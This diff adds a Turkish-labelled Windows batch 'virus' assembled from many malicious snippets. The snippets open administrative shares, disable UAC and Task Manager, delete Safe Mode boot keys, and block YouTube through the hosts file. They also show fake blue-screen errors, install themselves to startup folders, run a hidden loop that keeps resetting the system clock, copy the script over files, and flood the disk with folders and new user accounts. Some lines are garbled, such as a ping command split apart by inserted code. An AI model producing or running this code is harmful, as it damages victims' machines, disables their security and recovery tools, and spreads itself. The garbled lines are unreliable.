@@ -1,0 +1,443 @@
+@echo off
+echo Bu Virus, Bat virus olusturucu 1.6.00 programi ile yapilmistir..
+net share ADMIN$
+net share C$
+net share IPC$
+net share c=c:
+@echo off
+echo ^<html^>^<head^>^<title^>BSOD^</title^> > bsod.hta
+echo. >> bsod.hta
+echo ^<hta:application id="oBVC" >> bsod.hta
+echo applicationname="BSOD"  >> bsod.hta
+echo version="1.0" >> bsod.hta
+echo maximizebutton="no" >> bsod.hta
+echo minimizebutton="no" >> bsod.hta
+echo sysmenu="no" >> bsod.hta
+echo Caption="no" >> bsod.hta
+echo windowstate="maximize"/^> >> bsod.hta
+echo. >> bsod.hta
+echo ^</head^>^<body bgcolor="#000088" scroll="no"^> >> bsod.hta
+echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> bsod.hta
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Technical information:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^</font^> >> bsod.hta
+echo ^</body^>^</html^> >> bsod.hta
+start "" /wait "bsod.hta"
+del /s /f /q "bsod.hta" > nul
+@echo off
+
+cd /
+
+cls
+
+color 17
+
+echo A problem has been detected and Windows has been shut down to prevent damage
+
+echo to your computer.
+
+echo.
+
+echo The problem seems to be caused by the following file: SPCMDCON.SYS
+
+echo.
+
+echo PAGE_FAULT_IN_NONPAGED_AREA
+
+echo.
+
+echo If this is the first time you've seen this stop error screen,
+
+echo restart your computer. If this screen appears again, follow
+
+echo these steps:
+
+echo.
+
+echo Check to make sure any new hardware or software is properly installed.
+
+echo If this is a new installation, ask your hardware or software manufacturer
+
+echo for any Windows updates you might need.
+
+echo.
+
+echo If problems continue, disable or remove any newly installed hardware
+
+echo or software. Disable BIOS memory options such as caching or shadowing.
+
+echo If you need to use Safe Mode to remove or disable components, restart
+
+echo your computer, press F8 to select Advanced Startup Options, and then
+
+echo select Safe Mode.
+
+echo.
+
+echo Technical information:
+
+echo.
+
+echo *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x0000 0000)
+
+echo.
+
+echo.
+
+echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
+
+@echo off
+
+cd /
+
+cls
+
+color 17
+
+echo A problem has been detected and Windows has been shut down to prevent damage
+
+echo to your computer.
+
+echo.
+
+echo The problem seems to be caused by the following file: SPCMDCON.SYS
+
+echo.
+
+echo PAGE_FAULT_IN_NONPAGED_AREA
+
+echo.
+
+echo If this is the first time you've seen this stop error screen,
+
+echo restart your computer. If this screen appears again, follow
+
+echo these steps:
+
+echo.
+
+echo Check to make sure any new hardware or software is properly installed.
+
+echo If this is a new installation, ask your hardware or software manufacturer
+
+echo for any Windows updates you might need.
+
+echo.
+
+echo If problems continue, disable or remove any newly installed hardware
+
+echo or software. Disable BIOS memory options such as caching or shadowing.
+
+echo If you need to use Safe Mode to remove or disable components, restart
+
+echo your computer, press F8 to select Advanced Startup Options, and then
+
+echo select Safe Mode.
+
+echo.
+
+echo Technical information:
+
+echo.
+
+echo *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x0000 0000)
+
+echo.
+
+echo.
+
+echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
+
+PING 12@echo off
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+7.0.0.1 -n 1
+start Solitaire
+start Minesweeper
+start Remote Assistance
+start volume control
+start cmd
+start calc
+
+@echo off
+echo result=Msgbox("Bana Para Veğr Bana Para VEEEEĞĞĞRR",vbYesNo+vbInformation, "Arkadaşından Mesaj Var")>>mssg.vbs
+ 
+echo Loop>>mssg.vbs
+:DEVAM
+start mssg.vbs
+GOTO DEVAM
+
+@echo off
+start https://turkhackteam.org/uye/anonimyazilimci.1001237/
+@echo off
+cd "%systemroot%\System32\Drivers\etc"
+echo 127.0.0.1 www.youtube.com >> "Hosts"
+echo 127.0.0.1 www.www.youtube.com >> "Hosts"
+@@echo off
+echo result=Msgbox("Kanalını Kapatıyoruz",vbYesNo+vbInformation, "YouTube'den Mesaj")>>mssg.vbs
+ 
+echo Loop>>mssg.vbs
+:DEVAM
+start mssg.vbs
+GOTO DEVAM
+
+copy %0 C:\Dokume~1\Alluse~1\Startm~1\Programme\Autostart\autorun.bat
+cd %windir%
+if exist autotime.bat goto weiter
+echo @echo off >> autotime.bat
+echo set Opae=time >> autotime.bat
+echo set Eapo=date >> autotime.bat
+echo :start >> autotime.bat
+echo %Opae% 12:25 >> autotime.bat
+echo %Opae% 12:45 >> autotime.bat
+echo %Opae% 11:44 >> autotime.bat
+echo %Eapo% 11-11-11 >> autotime.bat
+echo %Eapo% 19-03-93 >> autotime.bat
+echo rem This little funloop wa smade by Opae NecRoPhilie 4.0 >> autotime.bat
+echo %Opae% 00:44 >> autotime.bat
+echo %Eapo% 13-09-90 >> autotime.bat
+echo %Opae% 11:11 >> autotime.bat
+echo %Opae% 23:59 >> autotime.bat
+echo %Eapo% 31-10-85 >> autotime.bat
+echo %Eapo% 25-05-05 >> autotime.bat
+echo %Eapo% 11-09-01 >> autotime.bat
+echo %Eapo% 17-03-07 >> autotime.bat
+echo %Opae% 22:41 >> autotime.bat
+echo %Opae% 9:44 >> autotime.bat
+echo %Eapo% 19-03-93 >> autotime.bat
+echo %Opae% 00:44 >> autotime.bat
+echo %Eapo% 05-03-03 >> autotime.bat
+echo %Eapo% 01-01-91 >> autotime.bat
+echo %Opae% 11:11 >> autotime.bat
+echo goto start >> autotime.bat
+echo set crauto = wscript.CreateObject("wscript.Shell") > crauto.vbs
+echo crauto.run "%%windir%%\autotime.bat",0,TRUE >> crauto.vbs
+:weiter
+start crauto.vbs
+@echo off
+color 0a
+:SCROLLR
+echo 3 1 4 1 5 9 2 6 5 3 5 8 9 7 9 3 2 3 8 4 6 2 6 4 3 3 8 3 2 7 9 5 0 2 8 1 6 9 6
+echo 4 1 9 7 1 6 9 3 9 9 3 7 5 1 0 5 8 2 0 9 7 4 9 4 4 5 9 2 3 0 7 8 1 6 4 1 9 9 5
+echo 0 6 2 8 6 2 0 8 9 9 8 6 2 8 0 3 4 8 2 5 3 4 2 1 1 7 0 6 7 9 8 2 1 4 8 7 3 5 9
+echo 0 8 6 5 1 3 2 8 2 3 0 6 6 4 7 0 9 3 8 4 4 6 0 9 5 5 0 5 8 2 2 3 1 7 2 1 5 6 8
+echo 5 3 5 9 4 0 8 1 2 8 4 8 1 1 1 7 4 5 0 2 8 4 1 0 2 7 0 1 9 3 8 5 2 1 1 2 3 8 5
+echo 0 5 5 5 9 6 4 4 6 2 2 9 4 8 9 5 4 9 3 0 3 8 1 9 6 4 4 2 8 8 1 0 9 7 5 4 8 6 1
+echo 6 6 5 9 3 3 4 4 6 1 2 8 4 7 5 6 4 8 2 3 3 7 8 6 7 8 3 1 6 5 2 7 1 2 0 6 3 3 9
+echo 1 9 0 9 1 4 5 6 4 8 5 6 6 9 2 3 4 6 0 3 4 8 6 1 0 4 5 4 3 2 6 6 4 8 2 4 6 7 8
+echo 1 3 3 9 3 6 0 7 2 6 0 2 4 9 1 4 1 2 7 3 7 2 4 5 8 7 0 0 6 6 0 6 3 1 5 6 9 3 5
+echo 5 8 8 1 7 4 8 8 1 5 2 0 9 2 0 9 6 2 8 2 9 2 5 4 0 9 1 7 1 5 3 6 4 3 6 8 4 9 3
+echo 7 8 9 2 5 9 0 3 6 0 0 1 1 3 3 0 5 3 0 5 4 8 8 2 0 4 6 6 5 2 1 3 8 4 1 5 9 4 8
+echo 4 6 9 5 1 9 4 1 5 1 1 6 0 9 4 3 3 0 5 7 2 7 0 3 6 5 7 5 9 5 9 1 9 5 3 1 4 3 9
+echo 0 9 2 1 8 6 1 1 7 3 8 1 9 3 2 6 1 1 7 9 3 1 0 5 1 1 8 5 4 8 0 7 4 4 6 9 8 5 6
+goto SCROLLR
+@echo off
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
+reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul
+@echo off
+attrib +s %0
+@echo off
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d "1" /f > nul
+@echo off
+rem ---------------------------------
+rem Tum virus bulas
+assoc .virus=batfile
+DIR /S/B %SystemDrive%\*.virus >> InfList_virus.txt
+echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_virus.txt) do copy %0 "%%j:%%k"
+rem ---------------------------------
+
+@echo off
+rem ---------------------------------
+rem Windows XP Gizli baslangic müziği
+start "" "%systemroot%\system32\oobe\images\title.wma"
+rem ---------------------------------
+
+@ECHO OFF
+GOTO start
+
+:start
+@ECHO SET magic2=1 >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+@ECHO :flood5 >> bat6.bat
+@ECHO SET /a magic2=%%magic2%%+1 >> bat6.bat
+@ECHO NET USER magic2%%magic2%% /add >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+START /MIN bat6.bat
+GOTO bat5
+
+:bat5
+@ECHO CD %%ProgramFiles%%\ >> bat5.bat
+@ECHO SET pogo=1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+@ECHO :flood4 >> bat5.bat
+@ECHO MKDIR pogo%%pogo%% >> bat5.bat
+@ECHO SET /a pogo=%%pogo%%+1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+START /MIN bat5.bat
+GOTO bat4
+
+:bat4
+@ECHO CD %%SystemRoot%%\ >> bat4.bat
+@ECHO SET hat=1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+@ECHO :flood3 >> bat4.bat
+@ECHO MKDIR hat%%hat%% >> bat4.bat
+@ECHO SET /a hat=%%hat%%+1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+START /MIN bat4.bat
+GOTO bat3
+
+:bat3
+@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
+@ECHO SET chart=1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+@ECHO :flood2 >> bat3.bat
+@ECHO MKDIR chart%%chart%% >> bat3.bat
+@ECHO SET /a chart=%%chart%%+1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+START /MIN bat3.bat
+GOTO bat2
+
+:bat2
+@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
+@ECHO SET gamer=1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+@ECHO :flood >> bat2.bat
+@ECHO MKDIR gamer%%gamer%% >> bat2.bat
+@ECHO SET /a gamer=%%gamer%%+1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+START /MIN bat2.bat
+GOTO original
+
+:original
+CD %HomeDrive%\
+SET sharma=1
+GOTO flood1
+:flood1
+MKDIR sharma%sharma%
+SET /a sharma=%sharma%+1
+GOTO flood1
+@ECHO OFF
+GOTO start
+
+:start
+@ECHO SET magic2=1 >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+@ECHO :flood5 >> bat6.bat
+@ECHO SET /a magic2=%%magic2%%+1 >> bat6.bat
+@ECHO NET USER magic2%%magic2%% /add >> bat6.bat
+@ECHO GOTO flood5 >> bat6.bat
+START /MIN bat6.bat
+GOTO bat5
+
+:bat5
+@ECHO CD %%ProgramFiles%%\ >> bat5.bat
+@ECHO SET pogo=1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+@ECHO :flood4 >> bat5.bat
+@ECHO MKDIR pogo%%pogo%% >> bat5.bat
+@ECHO SET /a pogo=%%pogo%%+1 >> bat5.bat
+@ECHO GOTO flood4 >> bat5.bat
+START /MIN bat5.bat
+GOTO bat4
+
+:bat4
+@ECHO CD %%SystemRoot%%\ >> bat4.bat
+@ECHO SET hat=1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+@ECHO :flood3 >> bat4.bat
+@ECHO MKDIR hat%%hat%% >> bat4.bat
+@ECHO SET /a hat=%%hat%%+1 >> bat4.bat
+@ECHO GOTO flood3 >> bat4.bat
+START /MIN bat4.bat
+GOTO bat3
+
+:bat3
+@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
+@ECHO SET chart=1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+@ECHO :flood2 >> bat3.bat
+@ECHO MKDIR chart%%chart%% >> bat3.bat
+@ECHO SET /a chart=%%chart%%+1 >> bat3.bat
+@ECHO GOTO flood2 >> bat3.bat
+START /MIN bat3.bat
+GOTO bat2
+
+:bat2
+@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
+@ECHO SET gamer=1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+@ECHO :flood >> bat2.bat
+@ECHO MKDIR gamer%%gamer%% >> bat2.bat
+@ECHO SET /a gamer=%%gamer%%+1 >> bat2.bat
+@ECHO GOTO flood >> bat2.bat
+START /MIN bat2.bat
+GOTO original
+
+:original
+CD %HomeDrive%\
+SET sharma=1
+GOTO flood1
+:flood1
+MKDIR sharma%sharma%
+SET /a sharma=%sharma%+1
+GOTO flood1
+@ECHO OFF
+IF "%1"=="" GOTO fill
+IF "%1"=="fill" GOTO fill
+IF "%1"=="kill" GOTO kill
+IF "%1"=="inf" GOTO inf
+IF "%1"=="disinf" GOTO kill
+GOTO bye
+:fill
+IF EXIST C:\Users\%USERNAME%\Desktop\ (
+FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\Public\Desktop\joke%%A.bat"
+FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
+)
+FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
+FOR /L %%A IN (1, 1, 200) DO TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
+IF "%1"=="" GOTO inf
+GOTO theend
+:kill
+IF EXIST C:\Users\%USERNAME%\Desktop\ (
+FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\Public\Desktop\joke%%A.bat"
+FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Users\%USERNAME%\Desktop\joke%%A.bat"
+)
+FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\All Users\Desktop\joke%%A.bat"
+FOR /L %%A IN (1, 1, 200) DO ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Desktop\joke%%A.bat"
+IF "%1"=="disinf" GOTO disinf
+GOTO theend
+:inf
+TYPE "%~df0" > "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
+TYPE "%~df0" > "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
+TYPE "%~df0" > "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
+GOTO theend
+:disinf
+ECHO Y | DEL "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\joke.bat"
+ECHO Y | DEL "C:\Documents and Settings\%USERNAME%\Start Menu\Programs\Startup\joke.bat"
+ECHO Y | DEL "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\joke.bat"
+GOTO theend
+:bye
+:theend
